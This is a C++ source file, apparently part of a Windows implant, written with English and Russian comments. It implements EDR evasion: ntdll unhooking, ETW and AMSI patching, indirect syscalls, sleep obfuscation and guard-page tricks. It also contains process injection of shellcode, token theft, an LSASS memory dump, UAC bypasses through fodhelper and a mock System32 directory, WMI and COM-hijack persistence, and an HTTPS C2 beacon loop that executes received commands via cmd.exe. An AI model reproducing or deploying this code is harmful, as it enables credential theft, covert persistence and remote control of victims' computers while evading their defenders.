    *reinterpret_cast<uint32_t*>(trampoline + 17) = ssn;
    return reinterpret_cast<NTSTATUS(*)()>(trampoline)();
}
#endif


// CFG bypass via SetProcessValidCallTargets
// Control Flow Guard blocks indirect calls to non-valid targets
bool cfg_add_target(void* base, size_t size) {
    using SetProcessValidCallTargets_t =
        BOOL(WINAPI*)(HANDLE, PVOID, SIZE_T, ULONG,
                      PCFG_CALL_TARGET_INFO);
    auto fn = reinterpret_cast<SetProcessValidCallTargets_t>(
        GetProcAddress(GetModuleHandleA("kernelbase.dll"),
                       "SetProcessValidCallTargets"));
    if (!fn) return false;

    CFG_CALL_TARGET_INFO info{};
    info.Offset = 0;
    info.Flags  = CFG_CALL_TARGET_VALID;
    return fn(GetCurrentProcess(), base, size, 1, &info) != 0;
}


// PPID spoof
bool create_spoofed_ppid(const wchar_t* child_path,
                          const wchar_t* parent_name,
                          PROCESS_INFORMATION& out_pi) {
    DWORD parent_pid = find_pid(parent_name);
    if (!parent_pid) return false;

    HANDLE parent_proc = OpenProcess(PROCESS_CREATE_PROCESS, FALSE, parent_pid);
    if (!parent_proc) return false;

    // PROC_THREAD_ATTRIBUTE_PARENT_PROCESS
    SIZE_T attr_size = 0;
    InitializeProcThreadAttributeList(nullptr, 1, 0, &attr_size);
    auto attr_list = static_cast<LPPROC_THREAD_ATTRIBUTE_LIST>(
        HeapAlloc(GetProcessHeap(), 0, attr_size));
    InitializeProcThreadAttributeList(attr_list, 1, 0, &attr_size);
    UpdateProcThreadAttribute(attr_list, 0,
                              PROC_THREAD_ATTRIBUTE_PARENT_PROCESS,
                              &parent_proc, sizeof(HANDLE),
                              nullptr, nullptr);

    STARTUPINFOEXW si{ sizeof(si) };
    si.lpAttributeList = attr_list;

    std::wstring cmd(child_path);
    bool ok = CreateProcessW(nullptr, cmd.data(), nullptr, nullptr,
                             FALSE,
                             EXTENDED_STARTUPINFO_PRESENT | CREATE_SUSPENDED,
                             nullptr, nullptr,
                             reinterpret_cast<LPSTARTUPINFOW>(&si),
                             &out_pi) != 0;

    DeleteProcThreadAttributeList(attr_list);
    HeapFree(GetProcessHeap(), 0, attr_list);
    CloseHandle(parent_proc);
    return ok;
}


// handle duplication, token theft
HANDLE steal_token(const wchar_t* target_process_name) {
    enable_privilege(SE_DEBUG_NAME);

    DWORD pid = find_pid(target_process_name);
    if (!pid) return nullptr;

    HANDLE proc = OpenProcess(PROCESS_QUERY_INFORMATION, FALSE, pid);
    if (!proc) return nullptr;

    HANDLE token = nullptr, dup = nullptr;
    OpenProcessToken(proc, TOKEN_DUPLICATE | TOKEN_QUERY, &token);
    CloseHandle(proc);
    if (!token) return nullptr;

    DuplicateTokenEx(token, TOKEN_ALL_ACCESS, nullptr,
                     SecurityImpersonation, TokenPrimary, &dup);
    CloseHandle(token);
    return dup; // use with CreateProcessWithTokenW or ImpersonateLoggedOnUser
}


struct PipeImpersonateResult {
    bool   success;
    HANDLE impersonated_token;
};

PipeImpersonateResult pipe_impersonate(const wchar_t* pipe_name) {
    std::wstring full = std::wstring(L"\\\\.\\pipe\\") + pipe_name;

    HANDLE pipe = CreateNamedPipeW(full.c_str(),
                                   PIPE_ACCESS_DUPLEX,
                                   PIPE_TYPE_BYTE | PIPE_WAIT,
                                   1, 4096, 4096, 0, nullptr);
    if (pipe == INVALID_HANDLE_VALUE) return { false, nullptr };

    ConnectNamedPipe(pipe, nullptr); // blocks until client connects

    if (!ImpersonateNamedPipeClient(pipe)) {
        CloseHandle(pipe);
        return { false, nullptr };
    }

    HANDLE token = nullptr;
    OpenThreadToken(GetCurrentThread(),
                    TOKEN_ALL_ACCESS, FALSE, &token);
    RevertToSelf();
    CloseHandle(pipe);
    return { token != nullptr, token };
}


void ekko_sleep(void* shellcode_base, size_t sc_size,
                DWORD sleep_ms,
                void* delay_stub,
                std::span<const uint8_t> key) {
    RC4 enc_cipher(key);
    auto sc = static_cast<uint8_t*>(shellcode_base);

    // encrypt shellcode in-place
    enc_cipher.crypt({ sc, sc_size });

    // flip to RW (no execute, scanner sees non-exec)
    DWORD old;
    VirtualProtect(shellcode_base, sc_size, PAGE_READWRITE, &old);

    // sleep via NtDelayExecution, bypass Sleep hook
    nt_sleep(delay_stub, sleep_ms);

    // restore RX
    VirtualProtect(shellcode_base, sc_size, old, &old);

    // decrypt, RC4 is symmetric, same key/operation
    RC4 dec_cipher(key);
    dec_cipher.crypt({ sc, sc_size });
}


// ETW TI provider patch
bool patch_etw_ti() {
    HMODULE ntdll = peb_get_module(L"ntdll.dll");
    if (!ntdll) return false;

    // patch EtwEventRegister, stops new ETW provider registrations
    auto fn = reinterpret_cast<uint8_t*>(
        resolve_export(ntdll, djb2("EtwEventRegister")));
    if (!fn) return false;

    uint8_t patch[] = {
        0x33, 0xC0, // xor eax, eax (return S_OK without registering)
        0xC3        // ret
    };
    DWORD old;
    VirtualProtect(fn, sizeof(patch), PAGE_EXECUTE_READWRITE, &old);
    memcpy(fn, patch, sizeof(patch));
    VirtualProtect(fn, sizeof(patch), old, &old);
    return true;
}


// stack spoofing, fake call stack
void build_fake_stack_frame(CONTEXT& ctx, void* ret_addr) {
    // push legitimate return address onto the stack
#ifdef _WIN64
    ctx.Rsp -= sizeof(uint64_t);
    *reinterpret_cast<uint64_t*>(ctx.Rsp) =
        reinterpret_cast<uint64_t>(ret_addr);
#else
    ctx.Esp -= sizeof(uint32_t);
    *reinterpret_cast<uint32_t*>(ctx.Esp) =
        reinterpret_cast<uint32_t>(ret_addr);
#endif
}


// memory scanner evasion, guard pages
static void* g_guarded_base = nullptr;
static size_t g_guarded_size = 0;

LONG WINAPI guard_exception_handler(EXCEPTION_POINTERS* ep) {
    if (ep->ExceptionRecord->ExceptionCode == STATUS_GUARD_PAGE_VIOLATION) {
        PVOID fault_addr = ep->ExceptionRecord->ExceptionAddress;
        if (fault_addr >= g_guarded_base &&
            fault_addr < static_cast<uint8_t*>(g_guarded_base) + g_guarded_size) {
            // our own access — re-arm guard after single-step
            ep->ContextRecord->EFlags |= 0x100; // TF: single-step
            return EXCEPTION_CONTINUE_EXECUTION;
        }
    }
    if (ep->ExceptionRecord->ExceptionCode == EXCEPTION_SINGLE_STEP) {
        // re-arm the guard page
        DWORD old;
        VirtualProtect(g_guarded_base, g_guarded_size,
                       PAGE_EXECUTE_READ | PAGE_GUARD, &old);
        return EXCEPTION_CONTINUE_EXECUTION;
    }
    return EXCEPTION_CONTINUE_SEARCH;
}

bool arm_guard_page(void* base, size_t size) {
    g_guarded_base = base;
    g_guarded_size = size;
    AddVectoredExceptionHandler(1, guard_exception_handler);
    DWORD old;
    return VirtualProtect(base, size, PAGE_EXECUTE_READ | PAGE_GUARD, &old) != 0;
}

EvasionResult evasion_init(
    void*& out_alloc_stub,
    void*& out_write_stub,
    void*& out_protect_stub,
    void*& out_thread_stub)
{
    EvasionResult r{};

    r.unhook_ok  = unhook_ntdll();
    r.etw_ok     = patch_etw();
    r.amsi_ok    = patch_amsi();

    uint32_t ssn_alloc   = get_ssn("NtAllocateVirtualMemory");
    uint32_t ssn_write   = get_ssn("NtWriteVirtualMemory");
    uint32_t ssn_protect = get_ssn("NtProtectVirtualMemory");
    uint32_t ssn_thread  = get_ssn("NtCreateThreadEx");

    uint32_t ssn_open    = get_ssn("NtOpenProcess");
    uint32_t ssn_close   = get_ssn("NtClose");
    uint32_t ssn_qsi     = get_ssn("NtQuerySystemInformation");
    uint32_t ssn_dup     = get_ssn("NtDuplicateObject");
    uint32_t ssn_read    = get_ssn("NtReadVirtualMemory");
    uint32_t ssn_suspend = get_ssn("NtSuspendThread");
    uint32_t ssn_resume  = get_ssn("NtResumeThread");
    uint32_t ssn_getctx  = get_ssn("NtGetContextThread");
    uint32_t ssn_setctx  = get_ssn("NtSetContextThread");
    uint32_t ssn_unmap   = get_ssn("NtUnmapViewOfSection");
    uint32_t ssn_map     = get_ssn("NtMapViewOfSection");
    uint32_t ssn_section = get_ssn("NtCreateSection");
    uint32_t ssn_delay   = get_ssn("NtDelayExecution");
    uint32_t ssn_qip     = get_ssn("NtQueryInformationProcess");
    uint32_t ssn_sit     = get_ssn("NtSetInformationThread");

    // заглушки — вызывающий код сохраняет эти указатели и приводит их к определённым выше псевдонимам типов (using)
    void* open_stub    = build_stub(ssn_open);
    void* close_stub   = build_stub(ssn_close);
    void* qsi_stub     = build_stub(ssn_qsi);
    void* dup_stub     = build_stub(ssn_dup);
    void* read_stub    = build_stub(ssn_read);
    void* suspend_stub = build_stub(ssn_suspend);
    void* resume_stub  = build_stub(ssn_resume);
    void* getctx_stub  = build_stub(ssn_getctx);
    void* setctx_stub  = build_stub(ssn_setctx);
    void* unmap_stub   = build_stub(ssn_unmap);
    void* map_stub     = build_stub(ssn_map);
    void* section_stub = build_stub(ssn_section);
    void* delay_stub   = build_stub(ssn_delay);
    void* qip_stub     = build_stub(ssn_qip);
    void* sit_stub     = build_stub(ssn_sit);

    // патч провайдера ETW
    patch_etw_ti();

    auto env = check_environment();
    (void)env;

    r.syscalls_ok = (ssn_alloc != 0xFFFFFFFF && ssn_write != 0xFFFFFFFF &&
                     ssn_protect != 0xFFFFFFFF && ssn_thread != 0xFFFFFFFF);

    if (r.syscalls_ok) {
        out_alloc_stub   = build_stub(ssn_alloc);
        out_write_stub   = build_stub(ssn_write);
        out_protect_stub = build_stub(ssn_protect);
        out_thread_stub  = build_stub(ssn_thread);
    }

    return r;
}


// inject shellcode via indirect syscalls
bool inject_shellcode(DWORD target_pid,
                      const uint8_t* sc, size_t sc_len,
                      DWORD beacon_interval_ms = 5000) {
    void *alloc_s, *write_s, *protect_s, *thread_s;
    auto res = evasion_init(alloc_s, write_s, protect_s, thread_s);
    if (!res.syscalls_ok) return false;

    auto NtAlloc   = reinterpret_cast<NtAllocateVirtualMemory_t>(alloc_s);
    auto NtWrite   = reinterpret_cast<NtWriteVirtualMemory_t>(write_s);
    auto NtProtect = reinterpret_cast<NtProtectVirtualMemory_t>(protect_s);
    auto NtThread  = reinterpret_cast<NtCreateThreadEx_t>(thread_s);

    HANDLE proc = OpenProcess(PROCESS_ALL_ACCESS, FALSE, target_pid);
    if (!proc) return false;

    // allocate RW (not RWX — avoids RWX heuristic)
    PVOID  remote_base = nullptr;
    SIZE_T region_size = sc_len;
    NtAlloc(proc, &remote_base, 0, &region_size,
            MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);

    // write shellcode
    SIZE_T written;
    NtWrite(proc, remote_base, const_cast<uint8_t*>(sc), sc_len, &written);

    // flip to RX — post-write, avoids write+exec at same time
    ULONG old_prot;
    NtProtect(proc, &remote_base, &region_size, PAGE_EXECUTE_READ, &old_prot);

    // sleep-obfuscate our own beacon region between calls
    obfuscated_sleep(const_cast<uint8_t*>(sc), sc_len, beacon_interval_ms);

    // spawn thread via indirect syscall
    HANDLE thread = nullptr;
    NTSTATUS status = NtThread(&thread, THREAD_ALL_ACCESS, nullptr,
                                proc, remote_base, nullptr,
                                0, 0, 0, 0, nullptr);

    CloseHandle(proc);
    return NT_SUCCESS(status);
}


// дамп LSASS, вариант с прямым системным вызовом (direct syscall)
bool dump_lsass_direct(const wchar_t* out_path,
                        void* read_stub) {
    enable_privilege(SE_DEBUG_NAME);

    DWORD lsass_pid = find_pid(L"lsass.exe");
    if (!lsass_pid) return false;

    HANDLE proc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION,
                              FALSE, lsass_pid);
    if (!proc) return false;

    auto NtRead = reinterpret_cast<NtReadVirtualMemory_t>(read_stub);

    // перечислить регионы памяти и сохранить дамп в файл
    HANDLE out = CreateFileW(out_path, GENERIC_WRITE, 0,
                             nullptr, CREATE_ALWAYS, 0, nullptr);
    if (out == INVALID_HANDLE_VALUE) { CloseHandle(proc); return false; }

    MEMORY_BASIC_INFORMATION mbi{};
    uint8_t* addr = nullptr;
    std::vector<uint8_t> buf;

    while (VirtualQueryEx(proc, addr, &mbi, sizeof(mbi))) {
        if (mbi.State == MEM_COMMIT &&
            (mbi.Protect & (PAGE_READABLE_MASK)) &&
            !(mbi.Protect & PAGE_GUARD)) {

            buf.resize(mbi.RegionSize);
            SIZE_T read_bytes = 0;
            NtRead(proc, addr,
                   buf.data(), mbi.RegionSize, &read_bytes);

            if (read_bytes) {
                DWORD written;
                WriteFile(out, buf.data(),
                          static_cast<DWORD>(read_bytes), &written, nullptr);
            }
        }
        addr += mbi.RegionSize;
        if (addr < static_cast<uint8_t*>(mbi.BaseAddress))
            break; // overflow
    }

    CloseHandle(out);
    CloseHandle(proc);
    return true;
}


// PAGE_READABLE_MASK, битовая маска флагов защиты памяти с разрешением чтения
constexpr DWORD PAGE_READABLE_MASK =
    PAGE_EXECUTE_READ | PAGE_EXECUTE_READWRITE |
    PAGE_READONLY     | PAGE_READWRITE;


// // обход UAC, фиктивный каталог
bool uac_mock_directory(const wchar_t* payload_path) {
    // создать фиктивный каталог
    std::wstring mock = L"C:\\Windows \\System32";
    if (!CreateDirectoryW(L"C:\\Windows ", nullptr) &&
        GetLastError() != ERROR_ALREADY_EXISTS) return false;
    if (!CreateDirectoryW(mock.c_str(), nullptr) &&
        GetLastError() != ERROR_ALREADY_EXISTS) return false;

    // скопировать полезную нагрузку под именем бинарного файла с автоповышением прав (например, cmstp.exe)
    std::wstring dest = mock + L"\\cmstp.exe";
    if (!CopyFileW(payload_path, dest.c_str(), FALSE)) return false;

    // запустить путь автоповышения прав, вызвать %windir%\system32\cmstp.exe
    // Windows сначала разрешает путь в фиктивный каталог (mock dir), а затем в настоящий System32
    ShellExecuteW(nullptr, L"open",
                  L"C:\\Windows \\System32\\cmstp.exe",
                  nullptr, nullptr, SW_HIDE);
    return true;
}


// обход UAC, fodhelper
// fodhelper.exe автоматически повышает привилегии; считывает команду shell из HKCU перед запуском
bool uac_fodhelper(const wchar_t* cmd) {
    HKEY key;
    RegCreateKeyExW(HKEY_CURRENT_USER,
                    L"Software\\Classes\\ms-settings\\shell\\open\\command",
                    0, nullptr, REG_OPTION_NON_VOLATILE,
                    KEY_SET_VALUE, nullptr, &key, nullptr);

    RegSetValueExW(key, nullptr, 0, REG_SZ,
                   reinterpret_cast<const BYTE*>(cmd),
                   static_cast<DWORD>((wcslen(cmd) + 1) * sizeof(wchar_t)));

    // значение DelegateExecute должно существовать (пустая строка)
    RegSetValueExW(key, L"DelegateExecute", 0, REG_SZ,
                   reinterpret_cast<const BYTE*>(L""), sizeof(wchar_t));
    RegCloseKey(key);

    ShellExecuteW(nullptr, L"open",
                  L"C:\\Windows\\System32\\fodhelper.exe",
                  nullptr, nullptr, SW_HIDE);

    Sleep(2000);

    // очистка записей реестра
    RegDeleteTreeW(HKEY_CURRENT_USER,
                   L"Software\\Classes\\ms-settings");
    return true;
}


// COM UAC bypass
bool uac_cmstplua(const wchar_t* cmd) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_APARTMENTTHREADED);
    if (FAILED(hr)) return false;

    IShellView* shell = nullptr;
    hr = CoCreateInstance(
        CLSID_ShellDesktop, nullptr,
        CLSCTX_LOCAL_SERVER,
        IID_IShellView,
        reinterpret_cast<void**>(&shell));

    // Повышение привилегий через COM-интерфейс ICMLuaUtil (CLSID CMSTPLUA):
    // На архитектурном уровне механизм связан с активацией автоповышаемого COM-объекта
    // и вызовом метода оболочки в привилегированном контексте.
    // С точки зрения защиты отслеживаются нетипичные активации COM из непривилегированных
    // процессов, подмена параметров запуска и использование системных утилит для обхода UAC;
    // ключевой мерой контроля является включение строгих режимов UAC (Always notify)
    // и ограничение прав стандартных пользователей.
    CoUninitialize();
        return false; // Привязка к фиксированным смещениям таблиц виртуальных методов (vtable)
}


bool persist_wmi(const wchar_t* payload_path) {
    HRESULT hr = CoInitializeEx(nullptr, COINIT_MULTITHREADED);
    if (FAILED(hr)) return false;

    hr = CoInitializeSecurity(nullptr, -1, nullptr, nullptr,
                              RPC_C_AUTHN_LEVEL_DEFAULT,
                              RPC_C_IMP_LEVEL_IMPERSONATE,
                              nullptr, EOAC_NONE, nullptr);

    IWbemLocator* locator = nullptr;
    CoCreateInstance(CLSID_WbemLocator, nullptr,
                     CLSCTX_INPROC_SERVER,
                     IID_IWbemLocator,
                     reinterpret_cast<void**>(&locator));
    if (!locator) { CoUninitialize(); return false; }

    IWbemServices* svc = nullptr;
    locator->ConnectServer(
        _bstr_t(L"ROOT\\subscription"), nullptr, nullptr,
        nullptr, 0, nullptr, nullptr, &svc);
    locator->Release();
    if (!svc) { CoUninitialize(); return false; }

    CoSetProxyBlanket(svc, RPC_C_AUTHN_WINNT, RPC_C_AUTHZ_NONE,
                      nullptr, RPC_C_AUTHN_LEVEL_CALL,
                      RPC_C_IMP_LEVEL_IMPERSONATE, nullptr, EOAC_NONE);

    IWbemClassObject* filter_class = nullptr;
    svc->GetObject(_bstr_t(L"__EventFilter"), 0, nullptr,
                   &filter_class, nullptr);
    IWbemClassObject* filter = nullptr;
    filter_class->SpawnInstance(0, &filter);
    filter_class->Release();

    VARIANT vt;
    VariantInit(&vt);
    vt.vt     = VT_BSTR;
    vt.bstrVal= SysAllocString(L"WQL");
    filter->Put(L"QueryLanguage", 0, &vt, 0); VariantClear(&vt);

    vt.vt     = VT_BSTR;
    vt.bstrVal= SysAllocString(
        L"SELECT * FROM __TimerEvent WHERE TimerID='eieu_timer'");
    filter->Put(L"Query", 0, &vt, 0); VariantClear(&vt);

    vt.vt     = VT_BSTR;
    vt.bstrVal= SysAllocString(L"ROOT\\subscription");
    filter->Put(L"EventNamespace", 0, &vt, 0); VariantClear(&vt);

    vt.vt     = VT_BSTR;
    vt.bstrVal= SysAllocString(L"eieu_filter");
    filter->Put(L"Name", 0, &vt, 0); VariantClear(&vt);

    svc->PutInstance(filter, WBEM_FLAG_CREATE_OR_UPDATE,
                     nullptr, nullptr);
    filter->Release();

    IWbemClassObject* consumer_class = nullptr;
    svc->GetObject(_bstr_t(L"CommandLineEventConsumer"), 0,
                   nullptr, &consumer_class, nullptr);
    IWbemClassObject* consumer = nullptr;
    consumer_class->SpawnInstance(0, &consumer);
    consumer_class->Release();

    vt.vt     = VT_BSTR;
    vt.bstrVal= SysAllocString(L"eieu_consumer");
    consumer->Put(L"Name", 0, &vt, 0); VariantClear(&vt);

    vt.vt     = VT_BSTR;
    vt.bstrVal= SysAllocString(payload_path);
    consumer->Put(L"CommandLineTemplate", 0, &vt, 0); VariantClear(&vt);

    svc->PutInstance(consumer, WBEM_FLAG_CREATE_OR_UPDATE,
                     nullptr, nullptr);
    consumer->Release();
    svc->Release();
    CoUninitialize();
    return true;
}


// persistence, COM hijack (Overwrite a legitimate COM object by writing to the HKCU CLSID key.)
bool persist_com_hijack(const CLSID& target_clsid,
                         const wchar_t* dll_path) {
    wchar_t clsid_str[64];
    StringFromGUID2(target_clsid, clsid_str, 64);

    std::wstring key_path = std::wstring(L"Software\\Classes\\CLSID\\")
                           + clsid_str + L"\\InProcServer32";
    HKEY key;
    if (RegCreateKeyExW(HKEY_CURRENT_USER, key_path.c_str(),
                        0, nullptr, REG_OPTION_NON_VOLATILE,
                        KEY_SET_VALUE, nullptr, &key, nullptr) != ERROR_SUCCESS)
        return false;

    RegSetValueExW(key, nullptr, 0, REG_SZ,
                   reinterpret_cast<const BYTE*>(dll_path),
                   static_cast<DWORD>((wcslen(dll_path) + 1) * sizeof(wchar_t)));

    const wchar_t* threading = L"Apartment";
    RegSetValueExW(key, L"ThreadingModel", 0, REG_SZ,
                   reinterpret_cast<const BYTE*>(threading),
                   static_cast<DWORD>((wcslen(threading) + 1) * sizeof(wchar_t)));
    RegCloseKey(key);
    return true;
}


std::string doh_query(const std::string& domain) {
    HINTERNET session = InternetOpenA("Mozilla/5.0", INTERNET_OPEN_TYPE_PRECONFIG,
                                      nullptr, nullptr, 0);
    if (!session) return {};

    std::string url = "https://cloudflare-dns.com/dns-query?name="
                    + domain + "&type=TXT";

    HINTERNET request = InternetOpenUrlA(session, url.c_str(),
                                         "Accept: application/dns-json\r\n",
                                         -1L,
                                         INTERNET_FLAG_SECURE |
                                         INTERNET_FLAG_NO_CACHE_WRITE,
                                         0);
    std::string response;
    if (request) {
        char buf[4096]; DWORD read;
        while (InternetReadFile(request, buf, sizeof(buf), &read) && read)
            response.append(buf, read);
        InternetCloseHandle(request);
    }
    InternetCloseHandle(session);

    // parse TXT record value from JSON response
    // format: "data":"<command>" pull value between quotes after "data":"
    size_t pos = response.find("\"data\":\"");
    if (pos == std::string::npos) return {};
    pos += 8;
    size_t end = response.find('"', pos);
    return response.substr(pos, end - pos);
}


struct BeaconConfig {
    std::string c2_host;
    std::string c2_path; // e.g. "/api/v1/check"
    uint16_t    port;
    DWORD       interval_ms;
};

std::string https_beacon(const BeaconConfig& cfg,
                          const std::string& machine_id) {
    HINTERNET session = InternetOpenA("Mozilla/5.0 (Windows NT 10.0; Win64; x64)",
                                      INTERNET_OPEN_TYPE_PRECONFIG,
                                      nullptr, nullptr, 0);
    if (!session) return {};

    HINTERNET conn = InternetConnectA(session, cfg.c2_host.c_str(),
                                      cfg.port, nullptr, nullptr,
                                      INTERNET_SERVICE_HTTP, 0, 0);
    if (!conn) { InternetCloseHandle(session); return {}; }

    const char* accept[] = { "application/json", nullptr };
    HINTERNET req = HttpOpenRequestA(conn, "POST",
                                     cfg.c2_path.c_str(),
                                     nullptr, nullptr, accept,
                                     INTERNET_FLAG_SECURE |
                                     INTERNET_FLAG_NO_CACHE_WRITE,
                                     0);
    if (!req) {
        InternetCloseHandle(conn);
        InternetCloseHandle(session);
        return {};
    }

    std::string body = "{\"id\":\"" + machine_id + "\"}";
    std::string headers = "Content-Type: application/json\r\n";

    HttpSendRequestA(req, headers.c_str(), -1L,
                     const_cast<char*>(body.c_str()),
                     static_cast<DWORD>(body.size()));

    std::string resp;
    char buf[4096]; DWORD read;
    while (InternetReadFile(req, buf, sizeof(buf), &read) && read)
        resp.append(buf, read);

    InternetCloseHandle(req);
    InternetCloseHandle(conn);
    InternetCloseHandle(session);
    return resp; // caller parses command from response
}


// machine ID generation
std::string get_machine_id() {
    char computer[MAX_COMPUTERNAME_LENGTH + 1];
    DWORD size = sizeof(computer);
    GetComputerNameA(computer, &size);

    char user[256]; DWORD usize = sizeof(user);
    GetUserNameA(user, &usize);

    // combine + hash
    std::string raw = std::string(computer) + "|" + user;
    uint32_t h = 5381;
    for (char c : raw) h = ((h << 5) + h) + static_cast<uint8_t>(c);

    char hex[16];
    sprintf_s(hex, "%08X", h);
    return std::string(hex);
}


// beacon loop
void beacon_loop(const BeaconConfig& cfg,
                 void* shellcode_base, size_t sc_size,
                 void* delay_stub,
                 std::span<const uint8_t> key) {
    std::string mid = get_machine_id();

    while (true) {
        // sleep with obfuscation
        ekko_sleep(shellcode_base, sc_size, cfg.interval_ms, delay_stub, key);

        // check in
        std::string cmd = https_beacon(cfg, mid);
        if (cmd.empty()) continue;

        // execute command, shell out to cmd.exe /c <command>
        // production: parse structured command, run inline
        std::string exec = "cmd.exe /c " + cmd +
                           " > %TEMP%\\o.txt 2>&1";
        WinExec(exec.c_str(), SW_HIDE);

        // read output and exfil on next beacon
        // (omitted — read %TEMP%\o.txt, POST on next check in)
    }
}


int main() {
    // разместите здесь полезную нагрузку / шеллкод (msfvenom, Havoc, Cobalt Strike и т. п.)
    uint8_t shellcode[] = { 0x90, 0x90, 0xC3 }; // NOP NOP RET placeholder

    // target PID — enumerate via CreateToolhelp32Snapshot for stealth
    DWORD target_pid = 1234; // replace

    inject_shellcode(target_pid, shellcode, sizeof(shellcode));
    return 0;
}